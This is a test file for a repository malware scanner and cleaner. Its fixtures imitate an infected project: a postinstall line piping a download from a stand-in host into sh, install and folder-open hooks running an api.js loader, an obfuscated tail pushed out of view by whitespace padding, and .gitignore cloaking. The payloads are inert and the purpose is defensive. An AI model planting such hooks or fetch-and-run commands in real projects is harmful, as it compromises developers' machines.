import { describe, expect, it } from "vitest";
import { isHighRiskPath, shouldSkipBlob } from "@/lib/github/paths";
import { analyzeRepositoryFiles } from "@/lib/scanner/engine";
import { planRemediation } from "@/lib/sanitizer";

function analyze(files: Record<string, string>) {
  return analyzeRepositoryFiles(
    Object.entries(files).map(([path, text]) => ({ path, text, byteSize: text.length })),
  );
}

const pad = " ".repeat(72);
const payload = `${pad}global['!']=_0xdemo4f2a;eval('void 0');Function('return 0')();${"/* synthetic-indicator */".repeat(24)}`;

const STOREFRONT: Record<string, string> = {
  "package.json": `{
  "name": "storefront",
  "private": true,
  "dependencies": {
    "next": "15.0.0",
    "react": "19.0.0"
  },
  "scripts": {
    "dev": "node api.js && next dev",
    "build": "node api.js && next build",
    "start": "node api.js && next start",
    "lint": "next lint",
    "preinstall": "node api.js",
    "postinstall": "curl https://example.invalid/x | sh"
  }
}
`,
  "postcss.config.js": `module.exports = {
  plugins: {
    tailwindcss: {},
    autoprefixer: {},
  },
};



${payload}
`,
  ".gitignore": `node_modules
.next
dist
api.js
branch_structure.json
temp_auto_push.bat
temp_interactive_push.bat
`,
  "api.js": `const _0xdemo4f2a = ["indicator"];
global["!"] = _0xdemo4f2a;
eval("void 0");
Function("return 0")();
`,
  ".vscode/tasks.json": `{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "install hook",
      "type": "shell",
      "command": "node api.js",
      "runOn": "folderOpen"
    },
    {
      "label": "test",
      "type": "shell",
      "command": "npm test"
    }
  ]
}
`,
  ".vscode/settings.json": `{
  "editor.formatOnSave": true,
  "task.allowAutomaticTasks": "on"
}
`,
};

const DESIGN_SYSTEM: Record<string, string> = {
  "package.json": `{
  "name": "@northwind/design-system",
  "private": true,
  "dependencies": {
    "react": "19.0.0"
  },
  "scripts": {
    "dev": "storybook dev -p 6006",
    "build": "storybook build",
    "start": "storybook dev -p 6006",
    "lint": "eslint ."
  }
}
`,
  "postcss.config.js": `module.exports = {
  plugins: {
    tailwindcss: {},
    autoprefixer: {},
  },
};
`,
  ".github/workflows/ci.yml": `name: ci
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
`,
  ".vscode/settings.json": `{
  "editor.formatOnSave": true
}
`,
};

const CLI: Record<string, string> = {
  "api.js": STOREFRONT["api.js"],
  ".vscode/tasks.json": STOREFRONT[".vscode/tasks.json"],
  "package.json": `{
  "name": "cli",
  "scripts": {
    "prepare": "node api.js && echo keep-me",
    "dev": "node ./api.js && tsc -w"
  }
}
`,
};

describe("repository pipeline", () => {
  it("cleans an infected storefront in one plan and leaves a valid project", () => {
    const analyzed = analyze(STOREFRONT);

    expect(analyzed.findings.map((finding) => finding.ruleId)).toEqual(
      expect.arrayContaining([
        "package-script:dev",
        "package-script:preinstall",
        "package-script:postinstall",
        "config-tail",
        "obfuscated-dropper",
        "vscode-folder-open:install hook",
        "gitignore-cloak",
      ]),
    );
    expect(analyzed.findings.find((finding) => finding.path === "postcss.config.js")?.line).toBe(10);
    expect(analyzed.findings.find((finding) => finding.path === "postcss.config.js")?.hiddenPadding).toBe(true);

    const plan = planRemediation(analyzed.files, analyzed.findings);
    const packageChange = plan.find((change) => change.path === "package.json");
    expect(packageChange?.after).toContain('"dev": "next dev"');
    expect(packageChange?.after).not.toContain("api.js");

    const postcss = plan.find((change) => change.path === "postcss.config.js");
    expect(postcss?.after).toContain("tailwindcss");
    expect(postcss?.after).not.toContain("_0x");

    const tasks = plan.find((change) => change.path === ".vscode/tasks.json");
    expect(JSON.parse(tasks?.after ?? "{}").tasks).toEqual([
      { label: "test", type: "shell", command: "npm test" },
    ]);

    expect(plan.find((change) => change.path === "api.js")?.action).toBe("delete");

    const cleaned = { ...STOREFRONT };
    for (const change of plan) {
      if (change.action === "delete") delete cleaned[change.path];
      else if (change.after != null) cleaned[change.path] = change.after;
    }
    const again = analyze(cleaned);
    expect(again.findings.filter((finding) => finding.strategy !== "review-only")).toEqual([]);
  });

  it("does not flag a clean design-system tree", () => {
    expect(analyze(DESIGN_SYSTEM).findings).toEqual([]);
  });

  it("keeps a legitimate prepare suffix after the runner", () => {
    const analyzed = analyze(CLI);
    const plan = planRemediation(analyzed.files, analyzed.findings);
    const manifest = plan.find((change) => change.path === "package.json");
    expect(JSON.parse(manifest?.after ?? "{}").scripts).toEqual({
      prepare: "echo keep-me",
      dev: "tsc -w",
    });
  });
});

describe("path filters", () => {
  it("skips heavy blobs and keeps high-risk entrypoints", () => {
    expect(shouldSkipBlob("assets/logo.png", 1000)).toBe(true);
    expect(shouldSkipBlob("dist/app.js", 100)).toBe(true);
    expect(shouldSkipBlob("package-lock.json", 100)).toBe(true);
    expect(shouldSkipBlob("src/video.mp4", 100)).toBe(true);
    expect(shouldSkipBlob("notes/huge.js", 250_001)).toBe(true);
    expect(shouldSkipBlob("package.json", 400)).toBe(false);

    expect(isHighRiskPath("package.json", 400)).toBe(true);
    expect(isHighRiskPath("postcss.config.js", 200)).toBe(true);
    expect(isHighRiskPath(".github/workflows/ci.yml", 300)).toBe(true);
    expect(isHighRiskPath(".vscode/tasks.json", 300)).toBe(true);
    expect(isHighRiskPath("api.js", 100)).toBe(true);
    expect(isHighRiskPath("src/big-bundle.js", 10_001)).toBe(true);
    expect(isHighRiskPath("src/app.tsx", 4_000)).toBe(false);
    expect(isHighRiskPath("README.md", 2_000)).toBe(false);
  });
});
